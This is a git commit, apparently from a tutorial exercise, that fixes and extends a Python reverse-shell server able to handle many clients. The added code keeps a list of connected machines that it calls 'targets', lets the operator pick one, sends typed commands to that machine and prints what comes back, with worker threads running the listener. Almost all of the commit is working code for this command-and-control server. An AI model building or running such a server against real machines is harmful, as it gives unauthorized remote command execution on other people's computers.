a37fef91cb7aa8d2aef871e094837e75f9d50a91
profitlettuce <profitlettuce@gmail.com>
2017-03-25 19:00:00 -0700

    completed tutorial

--- revshell/revshell_server_multi-client.py
+++ revshell/revshell_server_multi-client.py
@@ -1,5 +1,5 @@
 import socket
-import sys
+# import sys
 import threading
 from queue import Queue
 import time
@@ -29,7 +29,7 @@ def socket_bind():
         global port
         global s
         print("[+] Binding socket to port: " + str(port))
-        s.bind((host,port)))
+        s.bind((host,port))
         s.listen(5)
     except socket.error as msg:
         print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
@@ -45,11 +45,11 @@ def accept_connections():
 
     while True:
         try:
-            conn, addres = s.accept()
+            conn, address = s.accept()
             conn.setblocking(1)
             all_connections.append(conn)
             all_addresses.append(address)
-            print("\n[+] Connection established | " + address[0] + ":" + str(address[1]))")
+            print("\n[+] Connection established | " + address[0] + ":" + str(address[1]))
         except:
             print ("Error accepting connections")
 
@@ -67,8 +67,77 @@ def start_turtle():
         else:
             print("Command not recognized")
 
+# display connections
+def list_connections():
+    results = ''
+    for i,conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(1024)
+        except:
+            del all_connections[i]
+            del all_addresses[i]
+            continue
+        results += str(i) + ' ' + str(all_addresses[i][0]) + '\n'
+    print('------ Targets -----' + '\n' + results)
+
+# select a target
+def get_target(cmd):
+    try:
+        target = cmd.replace('select ','')
+        target = int(target)
+        conn = all_connections[target]
+        print("[+] Connected to target " + str(all_addresses[target][0]))
+        print(str(all_addresses[target][0]) + '> ', end="")
+        return conn
+    except:
+        print("Not a valid selection")
+        return None
+
+# connect to target
+def send_target_commands(conn):
+    while True:
+        try:
+            cmd = input()
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                target_response = str(conn.recv(2048), "utf-8")
+                print(target_response, end="")
+            if cmd == 'quit':
+                break
+        except:
+            print("Connection was lost")
+            break
+
+# create worker threads
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True
+        t.start()
+
+# each list item is  a new job
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+    queue.join()
+
+# do next job in queue
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            socket_create()
+            socket_bind()
+            accept_connections()
+        if x == 2:
+            start_turtle()
+        queue.task_done()
+
 # main
 def main():
+    create_workers()
+    create_jobs()
 
 if __name__ == '__main__':
     main()
